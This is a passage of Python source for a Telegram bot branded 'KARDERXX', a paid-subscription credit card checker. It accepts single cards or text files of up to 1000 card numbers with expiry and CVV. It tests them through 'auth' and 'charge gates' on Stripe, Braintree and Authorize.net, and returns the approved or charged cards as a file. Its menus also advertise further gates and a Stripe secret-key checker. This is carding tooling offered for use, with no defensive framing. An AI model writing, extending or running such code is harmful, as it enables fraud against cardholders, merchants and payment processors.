            return
        elif "Subscription expired" in subscription_status:
            await update.message.reply_text("🕒 **Your subscription has expired.** 🕒\n\nPlease renew using /subscribe.")
            return

    await update.message.reply_text("📄 **Please send the TXT file containing the credit card details.**")

    context.user_data['waiting_for_file'] = True

async def handle_document_auth(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    context.user_data['user_id'] = user_id
    if context.user_data.get('waiting_for_file'):
        if update.message.document is None:
            await update.message.reply_text("🚫 **Please send a valid TXT file containing the credit card details.**")
            return

        file = await update.message.document.get_file()
        file_path = await file.download_to_drive()

        with open(file_path, 'r') as f:
            combos = f.read().strip().split('\n')

        if len(combos) > 1000:
            await update.message.reply_text("📋 **Maximum 1000 credit cards allowed.**")
            return

        total_ccs = len(combos)
        approved_count = 0
        declined_count = 0

        processing_message = await update.message.reply_text(
            f"🔄 **Processing {total_ccs} CCs...** 🔄\n\n"
            f"✅ **APPROVED:** {approved_count}\n"
            f"❌ **DECLINED:** {declined_count}"
        )

        approved_ccs = []

        for combo in combos:
            if context.user_data.get('stop'):
                break
            combo_parts = combo.split('|')
            if len(combo_parts) != 4:
                await update.message.reply_text(f"🚫 **Invalid format:** {combo}")
                continue

            result = check_stripe_auth(combo_parts)
            if "Approved ✅" in result or "3DS Approved ✅" in result or "CCN MATCHED ✅" in result:
                approved_count += 1
                approved_ccs.append(combo)
                await update.message.reply_text(result)  # Send approved CCs separately
            else:
                declined_count += 1

            await processing_message.edit_text(
                f"🔄 **Processing {total_ccs} CCs...** 🔄\n\n"
                f"✅ **APPROVED:** {approved_count}\n"
                f"❌ **DECLINED:** {declined_count}"
            )
            await asyncio.sleep(1)

        if approved_ccs:
            with open("approved_ccs.txt", "w") as file:
                file.write("\n".join(approved_ccs))
            await update.message.reply_document(document=open("approved_ccs.txt", "rb"))

        context.user_data['waiting_for_file'] = False
        context.user_data['stop'] = False

async def bchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    context.user_data['user_id'] = user_id
    if not is_admin(user_id) and not is_owner(user_id):
        subscription_status = check_subscription(user_id)
        if "No active subscription" in subscription_status:
            await update.message.reply_text("🚫 **You do not have an active subscription.** 🚫\n\nPlease subscribe using /subscribe.")
            return
        elif "Subscription expired" in subscription_status:
            await update.message.reply_text("🕒 **Your subscription has expired.** 🕒\n\nPlease renew using /subscribe.")
            return

    message = update.message.text
    if message.startswith('/bchk '):
        combo = message[len('/bchk '):].split('|')
        if len(combo) != 4:
            await update.message.reply_text("🚫 **Invalid input format. Use cc|mm|yy|cvv.**")
            return

        processing_message = await update.message.reply_text("🔄 **Processing...** 🔄")
        result = check_braintree_charge(combo)
        await processing_message.edit_text(result)
    else:
        await update.message.reply_text("📋 **Please send the command with credit card details in the format:** /bchk cc|mm|yy|cvv")

async def bchktxt_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    context.user_data['user_id'] = user_id
    if not is_admin(user_id) and not is_owner(user_id):
        subscription_status = check_subscription(user_id)
        if "No active subscription" in subscription_status:
            await update.message.reply_text("𝗬𝗼𝘂 𝗗𝗼𝗻'𝘁 𝗛𝗮𝘃𝗲 𝗔𝗰𝘁𝗶𝗼𝗻 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 🚫\n𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲 𝗨𝘀𝗶𝗻𝗴 /subscribe.")
            return
        elif "Subscription expired" in subscription_status:
            await update.message.reply_text("𝗬𝗼𝘂𝗿 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗛𝗮𝘀 𝗘𝘅𝗽𝗶𝗿𝗲𝗱 🕒\n𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲 𝗨𝘀𝗶𝗻𝗴 /subscribe.")
            return

    await update.message.reply_text("📄 𝗦𝗲𝗻𝗱 𝗠𝗲 𝗧𝗵𝗲 𝗖𝗖 𝗳𝗶𝗹𝗲...")

    context.user_data['waiting_for_file'] = True

async def handle_document_bchk(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    context.user_data['user_id'] = user_id
    if context.user_data.get('waiting_for_file'):
        if update.message.document is None:
            await update.message.reply_text("🚫 **Please send a valid TXT file containing the credit card details.**")
            return

        file = await update.message.document.get_file()
        file_path = await file.download_to_drive()

        with open(file_path, 'r') as f:
            combos = f.read().strip().split('\n')

        if len(combos) > 1000:
            await update.message.reply_text("📋 **Maximum 1000 credit cards allowed.**")
            return

        total_ccs = len(combos)
        charged_count = 0
        declined_count = 0

        processing_message = await update.message.reply_text(
            f"🔄 **Processing {total_ccs} CCs...** 🔄\n\n"
            f"💳 **CHARGED:** {charged_count}\n"
            f"❌ **DECLINED:** {declined_count}"
        )

        approved_ccs = []

        for combo in combos:
            if context.user_data.get('stop'):
                break
            combo_parts = combo.split('|')
            if len(combo_parts) != 4:
                await update.message.reply_text(f"🚫 **Invalid format:** {combo}")
                continue

            result = check_braintree_charge(combo_parts)
            if "CVV MATCHED $25" in result:
                charged_count += 1
                approved_ccs.append(combo)
                await update.message.reply_text(result)  # Send charged CCs separately
            else:
                declined_count += 1

            await processing_message.edit_text(
                f"🐠Processing {total_ccs} CCs...👜n\n"
                f"💳 CHARGED: {charged_count}\n"
                f"❌ DECLINED: {declined_count}"
            )
            await asyncio.sleep(1)

        if approved_ccs:
            with open("approved_ccs.txt", "w") as file:
                file.write("\n".join(approved_ccs))
            await update.message.reply_document(document=open("approved_ccs.txt", "rb"))

        context.user_data['waiting_for_file'] = False
        context.user_data['stop'] = False

async def chk_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    context.user_data['user_id'] = user_id
    if not is_admin(user_id) and not is_owner(user_id):
        subscription_status = check_subscription(user_id)
        if "No active subscription" in subscription_status:
            await update.message.reply_text("𝗬𝗼𝘂 𝗗𝗼𝗻'𝘁 𝗛𝗮𝘃𝗲 𝗔𝗰𝘁𝗶𝗼𝗻 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 🚫\n𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲 𝗨𝘀𝗶𝗻𝗴 /subscribe.")
            return
        elif "Subscription expired" in subscription_status:
            await update.message.reply_text("𝗬𝗼𝘂𝗿 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 𝗛𝗮𝘀 𝗘𝘅𝗽𝗶𝗿𝗲𝗱 🕒\n𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲 𝗨𝘀𝗶𝗻𝗴 /subscribe.")
            return

    message = update.message.text
    if message.startswith('/chk '):
        combo = message[len('/chk '):].split('|')
        if len(combo) != 4:
            await update.message.reply_text("𝗜𝗻𝘃𝗮𝗹𝗶𝗱 𝗜𝗻𝗽𝘂𝘁 𝗙𝗼𝗿𝗺𝗮𝘁. 𝗸𝗶𝗻𝗱𝗹𝘆 𝗨𝘀𝗲 \n\n➺ /chk cc|mm|yy|cvv ")
            return

        processing_message = await update.message.reply_text("𝗣𝗿𝗼𝗰𝗲𝘀𝘀𝗶𝗻𝗴 𝗬𝗼𝘂𝗿 𝗥𝗲𝗾𝘂𝗲𝘀𝘁... ")
        result = check_braintree_auth(combo)
        await processing_message.edit_text(result)
    else:
        await update.message.reply_text("𝗣𝗹𝗲𝗮𝘀𝗲 𝗦𝗲𝗻𝗱 𝗠𝗲 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗪𝗶𝘁𝗵 𝗖𝗖 𝗱𝗲𝘁𝗮𝗶𝗹𝘀 𝗜𝗻 𝗙𝗼𝗿𝗺𝗮𝘁:  /chk cc|mm|yy|cvv")

async def chktxt_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    context.user_data['user_id'] = user_id
    if not is_admin(user_id) and not is_owner(user_id):
        subscription_status = check_subscription(user_id)
        if "No active subscription" in subscription_status:
            await update.message.reply_text("𝗬𝗼𝘂 𝗗𝗼𝗻'𝘁 𝗛𝗮𝘃𝗲 𝗔𝗰𝘁𝗶𝗼𝗻 𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗽𝘁𝗶𝗼𝗻 🚫\n𝗦𝘂𝗯𝘀𝗰𝗿𝗶𝗯𝗲 𝗨𝘀𝗶𝗻𝗴 /subscribe")
            return
        elif "Subscription expired" in subscription_status:
            await update.message.reply_text("🕒 **Your subscription has expired.** 🕒\n\nPlease renew using /subscribe.")
            return

    await update.message.reply_text("📄 **Please send the TXT file containing the credit card details.**")

    context.user_data['waiting_for_file'] = True

async def handle_document_chk(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    context.user_data['user_id'] = user_id
    if context.user_data.get('waiting_for_file'):
        if update.message.document is None:
            await update.message.reply_text("🚫 **Please send a valid TXT file containing the credit card details.**")
            return

        file = await update.message.document.get_file()
        file_path = await file.download_to_drive()

        with open(file_path, 'r') as f:
            combos = f.read().strip().split('\n')

        if len(combos) > 1000:
            await update.message.reply_text("📋 **Maximum 1000 credit cards allowed.**")
            return

        total_ccs = len(combos)
        approved_count = 0
        declined_count = 0

        processing_message = await update.message.reply_text(
            f"🔄 **Processing {total_ccs} CCs...** 🔄\n\n"
            f"✅ **APPROVED:** {approved_count}\n"
            f"❌ **DECLINED:** {declined_count}"
        )

        approved_ccs = []

        for combo in combos:
            if context.user_data.get('stop'):
                break
            combo_parts = combo.split('|')
            if len(combo_parts) != 4:
                await update.message.reply_text(f"🚫 **Invalid format:** {combo}")
                continue

            result = check_braintree_auth(combo_parts)
            if "CVV MATCHED" in result or "CCN MATCHED" in result:
                approved_count += 1
                approved_ccs.append(combo)
                await update.message.reply_text(result)  # Send approved CCs separately
            else:
                declined_count += 1

            await processing_message.edit_text(
                f"🔄 **Processing {total_ccs} CCs...** 🔄\n\n"
                f"✅ **APPROVED:** {approved_count}\n"
                f"❌ **DECLINED:** {declined_count}"
            )
            await asyncio.sleep(1)

        if approved_ccs:
            with open("approved_ccs.txt", "w") as file:
                file.write("\n".join(approved_ccs))
            await update.message.reply_document(document=open("approved_ccs.txt", "rb"))

        context.user_data['waiting_for_file'] = False
        context.user_data['stop'] = False

async def an_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    context.user_data['user_id'] = user_id
    if not is_admin(user_id) and not is_owner(user_id):
        subscription_status = check_subscription(user_id)
        if "No active subscription" in subscription_status:
            await update.message.reply_text("🚫 **You do not have an active subscription.** 🚫\n\nPlease subscribe using /subscribe.")
            return
        elif "Subscription expired" in subscription_status:
            await update.message.reply_text("🕒 **Your subscription has expired.** 🕒\n\nPlease renew using /subscribe.")
            return

    message = update.message.text
    if message.startswith('/an '):
        combo = message[len('/an '):].split('|')
        if len(combo) != 4:
            await update.message.reply_text("🚫 **Invalid input format. Use cc|mm|yy|cvv.**")
            return

        processing_message = await update.message.reply_text("🔄 **Processing...** 🔄")
        result = check_authorized_charge(combo)
        await processing_message.edit_text(result)
    else:
        await update.message.reply_text("📋 **Please send the command with credit card details in the format:** /an cc|mm|yy|cvv")

async def anchk_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    context.user_data['user_id'] = user_id
    if not is_admin(user_id) and not is_owner(user_id):
        subscription_status = check_subscription(user_id)
        if "No active subscription" in subscription_status:
            await update.message.reply_text("🚫 **You do not have an active subscription.** 🚫\n\nPlease subscribe using /subscribe.")
            return
        elif "Subscription expired" in subscription_status:
            await update.message.reply_text("🕒 **Your subscription has expired.** 🕒\n\nPlease renew using /subscribe.")
            return

    message = update.message.text
    if message.startswith('/anchk '):
        combos = message[len('/anchk '):].strip().split('\n')
        if len(combos) > 15:
            await update.message.reply_text("📋 **Maximum 15 credit cards allowed.** 📋")
            return

        total_ccs = len(combos)
        approved_count = 0
        declined_count = 0

        processing_message = await update.message.reply_text(
            f"🔄 **Processing {total_ccs} CCs...** 🔄\n\n"
            f"✅ **APPROVED:** {approved_count}\n"
            f"❌ **DECLINED:** {declined_count}"
        )

        approved_ccs = []

        for combo in combos:
            if context.user_data.get('stop'):
                break
            combo_parts = combo.split('|')
            if len(combo_parts) != 4:
                await update.message.reply_text(f"🚫 **Invalid format:** {combo}")
                continue

            result = check_authorized_charge(combo_parts)
            if "Approved ✅" in result or "3DS Approved ✅" in result or "CCN MATCHED ✅" in result:
                approved_count += 1
                approved_ccs.append(combo)
                await update.message.reply_text(result)  # Send approved CCs separately
            else:
                declined_count += 1

            await processing_message.edit_text(
                f"🔄 **Processing {total_ccs} CCs...** 🔄\n\n"
                f"✅ **APPROVED:** {approved_count}\n"
                f"❌ **DECLINED:** {declined_count}"
            )
            await asyncio.sleep(1)

        if approved_ccs:
            with open("approved_ccs.txt", "w") as file:
                file.write("\n".join(approved_ccs))
            await update.message.reply_document(document=open("approved_ccs.txt", "rb"))

        context.user_data['stop'] = False

    else:
        await update.message.reply_text("📋 **Please send the command with credit card details in the format:** /anchk cc|mm|yy|cvv")

async def anchktxt_command(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    context.user_data['user_id'] = user_id
    if not is_admin(user_id) and not is_owner(user_id):
        subscription_status = check_subscription(user_id)
        if "No active subscription" in subscription_status:
            await update.message.reply_text("🚫 **You do not have an active subscription.** 🚫\n\nPlease subscribe using /subscribe.")
            return
        elif "Subscription expired" in subscription_status:
            await update.message.reply_text("🕒 **Your subscription has expired.** 🕒\n\nPlease renew using /subscribe.")
            return

    await update.message.reply_text("📄 **Please send the TXT file containing the credit card details.**")

    context.user_data['waiting_for_file'] = True

async def handle_document_anchk(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    user_id = update.message.from_user.id
    context.user_data['user_id'] = user_id
    if context.user_data.get('waiting_for_file'):
        if update.message.document is None:
            await update.message.reply_text("🚫 **Please send a valid TXT file containing the credit card details.**")
            return

        file = await update.message.document.get_file()
        file_path = await file.download_to_drive()

        with open(file_path, 'r') as f:
            combos = f.read().strip().split('\n')

        if len(combos) > 1000:
            await update.message.reply_text("📋 **Maximum 1000 credit cards allowed.**")
            return

        total_ccs = len(combos)
        approved_count = 0
        declined_count = 0

        processing_message = await update.message.reply_text(
            f"🔄 **Processing {total_ccs} CCs...** 🔄\n\n"
            f"✅ **APPROVED:** {approved_count}\n"
            f"❌ **DECLINED:** {declined_count}"
        )

        approved_ccs = []

        for combo in combos:
            if context.user_data.get('stop'):
                break
            combo_parts = combo.split('|')
            if len(combo_parts) != 4:
                await update.message.reply_text(f"🚫 **Invalid format:** {combo}")
                continue

            result = check_authorized_charge(combo_parts)
            if "Approved ✅" in result or "3DS Approved ✅" in result or "CCN MATCHED ✅" in result:
                approved_count += 1
                approved_ccs.append(combo)
                await update.message.reply_text(result)  # Send approved CCs separately
            else:
                declined_count += 1

            await processing_message.edit_text(
                f"🔄 **Processing {total_ccs} CCs...** 🔄\n\n"
                f"✅ **APPROVED:** {approved_count}\n"
                f"❌ **DECLINED:** {declined_count}"
            )
            await asyncio.sleep(1)

        if approved_ccs:
            with open("approved_ccs.txt", "w") as file:
                file.write("\n".join(approved_ccs))
            await update.message.reply_document(document=open("approved_ccs.txt", "rb"))

        context.user_data['waiting_for_file'] = False
        context.user_data['stop'] = False

async def button(update: Update, context: ContextTypes.DEFAULT_TYPE) -> None:
    query = update.callback_query
    await query.answer()

    if query.data == 'register':
        user = query.from_user
        user_id = user.id
        context.user_data['user_id'] = user_id
        if is_registered(user_id):
            await query.edit_message_text("🚫 **You are already registered.**")
            return

        with open(f'data/registered_users/{user_id}.txt', 'w') as f:
            f.write("registered")

        username = user.username if user.username else user.first_name
        welcome_message = (
    f"🎉 Welcome, @{username}! 🎉\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "✨ <i>We're glad to have you here!</i>\n\n"
    "🔹 Enjoy exclusive features and premium benefits.\n"
    "🔹 Experience seamless performance and top-tier services.\n"
    "🔹 Connect, explore, and make the most out of it.\n\n"
    "💡 If you have any questions, feel free to reach out.\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "🔥 <b>Enjoy your stay!</b> 🔥\n"

            f"🔑 **Successfully Registered!** 🔑\n\n"
        )

        keyboard = [
            [InlineKeyboardButton("🚪 Gate", callback_data='gate')],
            [InlineKeyboardButton("❓ Help", callback_data='help')],
            [InlineKeyboardButton("🛠️ Tools", callback_data='tools')],
            [InlineKeyboardButton("🏆 Rank", callback_data='rank')]
        ]

        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_text(welcome_message, reply_markup=reply_markup)
    elif query.data == 'gate':
        gate_keyboard = [
            [InlineKeyboardButton("⚡ CHARGE", callback_data='charge'), InlineKeyboardButton("🔑 Auth", callback_data='auth')],
            [InlineKeyboardButton("⬅️ Go Back", callback_data='back'), InlineKeyboardButton("❌ Terminate", callback_data='terminate')]
        ]
        gate_reply_markup = InlineKeyboardMarkup(gate_keyboard)
        await query.edit_message_text(text="Welcome to the Gate! Choose an option:", reply_markup=gate_reply_markup)
    elif query.data == 'auth':
        auth_keyboard = [
            [InlineKeyboardButton(" Stripe Auth", callback_data='stripe_auth'), InlineKeyboardButton("Braintree Auth", callback_data='braintree_auth')],
            [InlineKeyboardButton("Monoris Auth", callback_data='monoris_auth'), InlineKeyboardButton("NMI Auth", callback_data='nmi_auth')],
            [InlineKeyboardButton("Paypal Auth", callback_data='paypal_auth'), InlineKeyboardButton("Square Auth", callback_data='square_auth')],
            [InlineKeyboardButton("⬅️ Go Back", callback_data='back_to_gate'), InlineKeyboardButton("❌ Terminate", callback_data='terminate')]
        ]
        auth_reply_markup = InlineKeyboardMarkup(auth_keyboard)
        await query.edit_message_text(text="Welcome to Auth! Choose an option:", reply_markup=auth_reply_markup)
    elif query.data == 'help':
        await query.edit_message_text(text="You tapped Help! ❓")
    elif query.data == 'tools':
        await query.edit_message_text(
    text=(
        "🔹 <b>BIV Commands</b> 🔹\n"
        "━━━━━━━━━━━━━━━━━━━━━━\n\n"
        "🔑 <b>/ai {message}</b>\n"
        "🤖 Chat with the AI and receive instant responses.\n\n"
        "🔍 <b>/bin {6-digit BIN}</b>\n"
        "📊 Retrieve BIN details with accurate data.\n\n"
        "🔑 <b>/sk {sk_key}</b>\n"
        "🛡️ Validate and check the provided key securely.\n\n"
        "━━━━━━━━━━━━━━━━━━━━━━"
    ),
    parse_mode="HTML",
)
    elif query.data == 'charge':
        charge_keyboard = [
            [InlineKeyboardButton("⚡ STRIPE 1$ CHARGE", callback_data='stripe_charge'), InlineKeyboardButton("🔒 Authorized.net 5$ CHARGE", callback_data='authorized_charge')],
            [InlineKeyboardButton("🔒 Braintree CHARGE", callback_data='braintree_charge'), InlineKeyboardButton("🔒 Payflow 5 CHARGE", callback_data='payflow_charge')],
            [InlineKeyboardButton("🔒 Ayden 5$ CHARGE", callback_data='ayden_charge')],
            [InlineKeyboardButton("⬅️ Go Back", callback_data='back_to_gate')]
        ]
        charge_reply_markup = InlineKeyboardMarkup(charge_keyboard)
        await query.edit_message_text(text="Welcome to CHARGE! Choose an option:", reply_markup=charge_reply_markup)
    elif query.data == 'stripe_auth':
        stripe_auth_message = (
            "𝗞𝗔𝗥𝗗𝗘𝗥𝗫𝗫 - Stripe\n"
            "🔹Auth Gates\n"
            "🔹 Status: ✅ Active\n\n"
            "🚀 Quick Command Overview:\n\n"
            "✘ Stripe Auth Options:\n"
            "   ┏ Stripe Auth\n"
            "   ┣ Single Command: /stra cc|mm|yy|cvv\n"
            "   ┣ Mass Command: /mstra\n"
            "   ┗ TXT Command: /strtxta\n\n"
            "✨ Total Auth Commands: 3"
        )

        stripe_auth_keyboard = [
            [InlineKeyboardButton("⬅️ Go Back", callback_data='back_to_auth')]
        ]
        stripe_auth_reply_markup = InlineKeyboardMarkup(stripe_auth_keyboard)
        await query.edit_message_text(text=stripe_auth_message, reply_markup=stripe_auth_reply_markup)
    elif query.data == 'braintree_auth':
        braintree_auth_message = (
            "𝗞𝗔𝗥𝗗𝗘𝗥𝗫𝗫 - Braintree\n"
            "🔹Auth Gates\n"
            "🔹 Status: ✅ Active\n\n"
            "🚀 Quick Command Overview:\n\n"
            "✘ Braintree Auth Options:\n"
            "   ┏ Braintree Auth\n"
            "   ┣ Single Command: /chk cc|mm|yy|cvv\n"
            "   ┣ Mass Command: /bchk\n"
            "   ┗ TXT Command: /chktxt\n\n"
            "✨ Total Auth Commands: 3"
        )

        braintree_auth_keyboard = [
            [InlineKeyboardButton("⬅️ Go Back", callback_data='back_to_auth')]
        ]
        braintree_auth_reply_markup = InlineKeyboardMarkup(braintree_auth_keyboard)
        await query.edit_message_text(text=braintree_auth_message, reply_markup=braintree_auth_reply_markup)
    elif query.data == 'monoris_auth':
        monoris_auth_message = (
            "𝗞𝗔𝗥𝗗𝗘𝗥𝗫𝗫 - Monoris\n"
            "🔹Auth Gates\n"
            "🔹 Status: ❌ COMING SOON\n\n"
            "🚀 Quick Command Overview:\n\n"
            "✘ Monoris Auth Options:\n"
            "   ┏ Monoris Auth\n"
            "   ┣ Single Command: /mon cc|mm|yy|cvv\n"
            "   ┣ Mass Command: /monchk\n"
            "   ┗ TXT Command: /monchktxt\n\n"
            "✨ Total Auth Commands: 3"
        )

        monoris_auth_keyboard = [
            [InlineKeyboardButton("⬅️ Go Back", callback_data='back_to_auth')]
        ]
        monoris_auth_reply_markup = InlineKeyboardMarkup(monoris_auth_keyboard)
        await query.edit_message_text(text=monoris_auth_message, reply_markup=monoris_auth_reply_markup)
    elif query.data == 'nmi_auth':
        nmi_auth_message = (
            "𝗞𝗔𝗥𝗗𝗘𝗥𝗫𝗫 - NMI\n"
            "🔹Auth Gates\n"
            "🔹 Status: ❌ COMING SOON\n\n"
            "🚀 Quick Command Overview:\n\n"
            "✘ NMI Auth Options:\n"
            "   ┏ NMI Auth\n"
            "   ┣ Single Command: /nmi cc|mm|yy|cvv\n"
            "   ┣ Mass Command: /nmichk\n"
            "   ┗ TXT Command: /nmichktxt\n\n"
            "✨ Total Auth Commands: 3"
        )

        nmi_auth_keyboard = [
            [InlineKeyboardButton("⬅️ Go Back", callback_data='back_to_auth')]
        ]
        nmi_auth_reply_markup = InlineKeyboardMarkup(nmi_auth_keyboard)
        await query.edit_message_text(text=nmi_auth_message, reply_markup=nmi_auth_reply_markup)
    elif query.data == 'paypal_auth':
        paypal_auth_message = (
            "𝗞𝗔𝗥𝗗𝗘𝗥𝗫𝗫 - Paypal\n"
            "🔹Auth Gates\n"
            "🔹 Status: ❌ COMING SOON\n\n"
            "🚀 Quick Command Overview:\n\n"
            "✘ Paypal Auth Options:\n"
            "   ┏ Paypal Auth\n"
            "   ┣ Single Command: /pay cc|mm|yy|cvv\n"
            "   ┣ Mass Command: /paychk\n"
            "   ┗ TXT Command: /paychktxt\n\n"
            "✨ Total Auth Commands: 3"
        )

        paypal_auth_keyboard = [
            [InlineKeyboardButton("⬅️ Go Back", callback_data='back_to_auth')]
        ]
        paypal_auth_reply_markup = InlineKeyboardMarkup(paypal_auth_keyboard)
        await query.edit_message_text(text=paypal_auth_message, reply_markup=paypal_auth_reply_markup)
    elif query.data == 'square_auth':
        square_auth_message = (
            "𝗞𝗔𝗥𝗗𝗘𝗥𝗫𝗫 - Square\n"
            "🔹Auth Gates\n"
            "🔹 Status: ❌ COMING SOON\n\n"
            "🚀 Quick Command Overview:\n\n"
            "✘ Square Auth Options:\n"
            "   ┏ Square Auth\n"
            "   ┣ Single Command: /sq cc|mm|yy|cvv\n"
            "   ┣ Mass Command: /sqchk\n"
            "   ┗ TXT Command: /sqchktxt\n\n"
            "✨ Total Auth Commands: 3"
        )

        square_auth_keyboard = [
            [InlineKeyboardButton("⬅️ Go Back", callback_data='back_to_auth')]
        ]
        square_auth_reply_markup = InlineKeyboardMarkup(square_auth_keyboard)
        await query.edit_message_text(text=square_auth_message, reply_markup=square_auth_reply_markup)
    elif query.data == 'stripe_charge':
        stripe_charge_message = (
            "𝗞𝗔𝗥𝗗𝗘𝗥𝗫𝗫 - Stripe\n"
            "🔹Charge Gates\n"
            "🔹 Status: ✅ Active\n\n"
            "🚀 Quick Command Overview:\n\n"
            "✘ Stripe Charge Options:\n"
            "   ┏ Stripe Charge\n"
            "   ┣ Single Command: /str cc|mm|yy|cvv\n"
            "   ┣ Mass Command: /mstr\n"
            "   ┗ TXT Command: /strtxt\n\n"
            "✨ Total Charge Commands: 3"
        )

        stripe_charge_keyboard = [
            [InlineKeyboardButton("⬅️ Go Back", callback_data='back_to_charge')]
        ]
        stripe_charge_reply_markup = InlineKeyboardMarkup(stripe_charge_keyboard)
        await query.edit_message_text(text=stripe_charge_message, reply_markup=stripe_charge_reply_markup)
    elif query.data == 'authorized_charge':
        authorized_charge_message = (
            "𝗞𝗔𝗥𝗗𝗘𝗥𝗫𝗫 - Authorized.net\n"
            "🔹Charge Gates\n"
            "🔹 Status: ✅ Active\n\n"
            "🚀 Quick Command Overview:\n\n"
            "✘ Authorized.net Charge Options:\n"
            "   ┏ Authorized.net Charge\n"
            "   ┣ Single Command: /an cc|mm|yy|cvv\n"
            "   ┣ Mass Command: /anchk\n"
            "   ┗ TXT Command: /anchktxt\n\n"
            "✨ Total Charge Commands: 3"
        )

        authorized_charge_keyboard = [
            [InlineKeyboardButton("⬅️ Go Back", callback_data='back_to_charge')]
        ]
        authorized_charge_reply_markup = InlineKeyboardMarkup(authorized_charge_keyboard)
        await query.edit_message_text(text=authorized_charge_message, reply_markup=authorized_charge_reply_markup)
    elif query.data == 'braintree_charge':
        braintree_charge_message = (
            "𝗞𝗔𝗥𝗗𝗘𝗥𝗫𝗫 - Braintree\n"
            "🔹Charge Gates\n"
            "🔹 Status: ✅ Active\n\n"
            "🚀 Quick Command Overview:\n\n"
            "✘ Braintree Charge Options:\n"
            "   ┏ Braintree Charge\n"
            "   ┣ Single Command: /bchk cc|mm|yy|cvv\n"
            "   ┣ Mass Command: /bchktxt\n"
            "   ┗ TXT Command: /bchktxt\n\n"
            "✨ Total Charge Commands: 3"
        )

        braintree_charge_keyboard = [
            [InlineKeyboardButton("⬅️ Go Back", callback_data='back_to_charge')]
        ]
        braintree_charge_reply_markup = InlineKeyboardMarkup(braintree_charge_keyboard)
        await query.edit_message_text(text=braintree_charge_message, reply_markup=braintree_charge_reply_markup)
    elif query.data == 'payflow_charge':
        payflow_charge_message = (
            "𝗞𝗔𝗥𝗗𝗘𝗥𝗫𝗫 - Payflow\n"
            "🔹Charge Gates\n"
            "🔹 Status: ❌ COMING SOON\n\n"
            "🚀 Quick Command Overview:\n\n"
            "✘ Payflow Charge Options:\n"
            "   ┏ Payflow Charge\n"
            "   ┣ Single Command: /pay cc|mm|yy|cvv\n"
            "   ┣ Mass Command: /paychk\n"
            "   ┗ TXT Command: /paychktxt\n\n"
            "✨ Total Charge Commands: 3"
        )

        payflow_charge_keyboard = [
            [InlineKeyboardButton("⬅️ Go Back", callback_data='back_to_charge')]
        ]
        payflow_charge_reply_markup = InlineKeyboardMarkup(payflow_charge_keyboard)
        await query.edit_message_text(text=payflow_charge_message, reply_markup=payflow_charge_reply_markup)
    elif query.data == 'ayden_charge':
        ayden_charge_message = (
            "𝗞𝗔𝗥𝗗𝗘𝗥𝗫𝗫 - Ayden\n"
            "🔹Charge Gates\n"
            "🔹 Status: ❌ COMING SOON\n\n"
            "🚀 Quick Command Overview:\n\n"
            "✘ Ayden Charge Options:\n"
            "   ┏ Ayden Charge\n"
            "   ┣ Single Command: /ay cc|mm|yy|cvv\n"
            "   ┣ Mass Command: /aychk\n"
            "   ┗ TXT Command: /aychktxt\n\n"
            "✨ Total Charge Commands: 3"
        )

        ayden_charge_keyboard = [
            [InlineKeyboardButton("⬅️ Go Back", callback_data='back_to_charge')]
        ]
        ayden_charge_reply_markup = InlineKeyboardMarkup(ayden_charge_keyboard)
        await query.edit_message_text(text=ayden_charge_message, reply_markup=ayden_charge_reply_markup)
    elif query.data == 'back':
        user = query.from_user
        username = user.username if user.username else user.first_name
        welcome_message = (
    f"🎉 Welcome, @{username}! 🎉\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "✨ <i>We're glad to have you here!</i>\n\n"
    "🔹 Enjoy exclusive features and premium benefits.\n"
    "🔹 Experience seamless performance and top-tier services.\n"
    "🔹 Connect, explore, and make the most out of it.\n\n"
    "💡 If you have any questions, feel free to reach out.\n"
    "━━━━━━━━━━━━━━━━━━━━━━\n"
    "🔥 <b>Enjoy your stay!</b> 🔥\n"
)

        keyboard = [
            [InlineKeyboardButton("🚪 Gate", callback_data='gate')],
            [InlineKeyboardButton("❓ Help", callback_data='help')],
            [InlineKeyboardButton("🛠️ Tools", callback_data='tools')],
            [InlineKeyboardButton("🏆 Rank", callback_data='rank')]
        ]

        reply_markup = InlineKeyboardMarkup(keyboard)

        await query.edit_message_text(welcome_message, reply_markup=reply_markup)
    elif query.data == 'back_to_gate':
        gate_keyboard = [
            [InlineKeyboardButton("⚡ CHARGE", callback_data='charge'), InlineKeyboardButton("🔑 Auth", callback_data='auth')],
            [InlineKeyboardButton("⬅️ Go Back", callback_data='back'), InlineKeyboardButton("❌ Terminate", callback_data='terminate')]
        ]
        gate_reply_markup = InlineKeyboardMarkup(gate_keyboard)
        await query.edit_message_text(text="Welcome to the Gate! Choose an option:", reply_markup=gate_reply_markup)
    elif query.data == 'back_to_auth':
        auth_keyboard = [
